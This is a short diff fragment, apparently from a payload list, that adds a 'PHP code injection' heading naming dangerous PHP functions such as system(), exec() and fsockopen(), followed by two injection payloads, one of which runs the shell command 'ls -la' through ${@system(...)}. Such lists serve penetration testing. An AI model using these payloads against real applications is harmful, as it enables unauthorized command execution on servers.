@@ -1,0 +1,4 @@
+~ PHP CODE INJECTION ~ { system() passthru() exec() shell_exec() fopen() file_get_contents() readfile() fsockopen() }
+
+${@print('test')}
+${@system('ls -la')}
